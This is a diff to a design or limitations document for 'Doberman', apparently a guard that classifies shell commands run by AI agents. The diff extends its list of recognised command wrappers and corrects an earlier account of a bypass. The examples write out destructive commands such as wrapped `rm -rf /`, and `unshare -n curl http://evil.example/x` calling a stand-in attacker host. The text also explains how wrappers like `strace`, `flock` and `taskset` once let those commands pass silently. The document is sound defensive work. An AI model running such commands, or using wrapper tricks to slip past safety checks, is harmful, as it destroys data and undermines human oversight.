@@ -259,10 +259,11 @@ wrapper's own option as if it were the command, and missed what came after it.
 
 The shared command-parsing helper now recognizes each of these wrappers' own value-taking options
 and skips past them before looking for the wrapped command: `sudo`, `doas`, `runuser`, `env`,
-`nice`, `ionice`, `timeout`, `chroot`, `time`, `exec`, `stdbuf`, `nohup`, `command`, and `setsid`. It
-chains through nested wrappers too, for example `sudo -n nice -n 5 rm -rf /`. `runuser -c`,
-`--command`, and `--command=` are treated as opaque, exactly like `su -c`: their payload is walked
-the same way, never treated as an option to skip past.
+`nice`, `ionice`, `timeout`, `chroot`, `time`, `exec`, `stdbuf`, `nohup`, `command`, `setsid`,
+`builtin`, `strace`, `taskset`, `flock`, and `unshare`. It chains through nested wrappers too, for
+example `sudo -n nice -n 5 rm -rf /`. `runuser -c`/`--command`/`--command=` and `flock -c`/
+`--command` are treated as opaque, exactly like `su -c`: their payload is walked the same way, never
+treated as an option to skip past.
 
 Now that the wrapped command is recovered, a wrapped `rm -rf /` gets `BLOCK`ed and a wrapped secret
 exfiltration attempt gets the same verdict as its unwrapped form. That closes what used to be a real
@@ -281,10 +282,19 @@ split cleanly into shell tokens, the leftover option or value tokens are never r
 either. A command segment whose first word is still an unresolved option after wrapper stripping
 steps up to `AUTH` (`opaque_command`) instead of silently passing through.
 
-The honest remaining gap: a wrapper outside this list, such as `strace`, `flock`, `unshare`, or
-`taskset`, still shifts the argument list in a way Doberman doesn't recognize, so its wrapped command
-isn't seen at all. Egress behind one of those still steps up through the existing ambiguous-egress
-`AUTH`, never a silent `PASS`.
+Before this fix, `strace`, `flock`, `unshare`, and `taskset` were exactly that kind of unrecognized
+wrapper, and the actual result was worse than the ambiguous-egress `AUTH` this document used to claim:
+none of the four was on the wrapper list at all, so the shared helper didn't even try to skip past
+their options — it read the wrapper's own name as the command verb, found no destructive pattern and
+no known egress tool there, and let the whole line through. `strace -f rm -rf /`, `flock /tmp/lock
+rm -rf /`, `taskset -c 0 rm -rf /`, and `unshare -n curl http://evil.example/x` were each a silent
+`PASS`, hiding the wrapped command entirely rather than stepping up to `AUTH`. All four are now on
+the recognized-wrapper list above and classify the same as their unwrapped form.
+
+The honest remaining gap: a wrapper outside that list still shifts the argument list in a way
+Doberman doesn't recognize, so its wrapped command isn't seen at all — the same silent-`PASS` failure
+mode these four just came out of, not the `AUTH` step-up this section previously (and incorrectly)
+described.
 
 ## Behavior-learning checks only run on the MCP proxy path today, not on the Claude Code or OpenClaw hooks
 
